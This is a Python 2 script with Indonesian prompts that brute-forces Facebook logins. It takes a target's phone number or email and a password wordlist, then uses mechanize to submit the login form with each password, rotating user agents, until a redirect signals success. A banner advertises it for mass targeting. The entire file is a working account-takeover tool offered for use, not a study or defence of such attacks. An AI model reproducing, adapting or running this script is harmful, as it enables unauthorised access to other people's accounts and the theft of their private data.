#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import sys
import mechanize
import cookielib
import random



print("SILAKAN MASUKAN NOMOR OR EMAIL TARGET")
email = str(raw_input("\033[37;1m[?] \033[31;1m> \033[37;1mINPUT NOMOR / EMAIL TARGET \033[31;1m> :  "))


passwordlist = str(raw_input("\033[37;1m[¿] \033[31;1m> \033[37;1mINPUT FILE / KETIKAN AJA \033[31;1mpass.txt :  "))

tytyd = str(raw_input("\033[37;1m[\033[1;33m●\033[37;1m] JANGAN LUPA BISSMILLAH \033[31;1m[!](Tekan Enter)"))
login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	hell()
	search()
	print("Wordlist Habis! Let's try again - Nelo.F4")

	
	
def brute(password):
	sys.stdout.write("\r[!] Trying ..... {}\n".format(password))
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = email
	br.form['pass'] = password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
			print("\n\n[+] Password Detected! = {}".format(password))
			raw_input("Have a nice day - Nelo.F4")
			sys.exit(1)

			
def search():
	global password
	passwords = open(passwordlist,"r")
	for password in passwords:
		password = password.replace("\n","")
		brute(password)

def hell():
    color = "\033[31;1m"
    hel = """
 
\033[37;1m[\033[1;33m●\033[37;1m] \033[37;1mDEVLOPER : \033[35;1mFAIZUL
\033[37;1m[\033[1;33m●\033[37;1m] \033[37;1mINFO DEVICE : \033[35;1mSSJ2DUOS
\033[37;1m[\033[1;33m●\033[37;1m] \033[37;1mFUNGSI : \033[35;1mTARGET MASSAL
\033[37;1m[\033[1;33m?\033[37;1m] \033[39;1mVERSION : 7,8 
"""
    wkwk ="\033[32;1m"
    total = open(passwordlist,"r")
    total = total.readlines()
    print (color+hel)
    print (wkwk)
    print "  \033[1;33m[!] \033[35;1mTarget : {}".format(email)
    print "  \033[1;33m[!] \033[35;1mLoaded :" , len(total), "password"
    print "  \033[1;33m[!] \033[35;1mWait, ngopi aja dulu ...\n\n"


if __name__ == '__main__':
            main()
        
